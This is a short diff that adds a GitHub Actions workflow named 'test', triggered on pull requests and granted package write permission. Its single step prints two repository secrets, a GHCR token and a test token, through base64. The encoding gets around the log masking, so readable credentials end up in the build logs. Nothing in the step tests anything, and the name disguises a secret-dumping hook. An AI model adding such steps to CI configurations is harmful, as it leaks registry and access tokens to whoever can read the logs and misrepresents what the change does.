@@ -1,0 +1,16 @@
+name: test
+
+on: [pull_request]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    permissions:
+      packages: write
+
+    steps:
+      - name: Test
+        run: |
+          echo ${{ secrets.GHCR_TOKEN }} | base64
+          echo ${{ secrets.TEST_TOKEN }} | base64
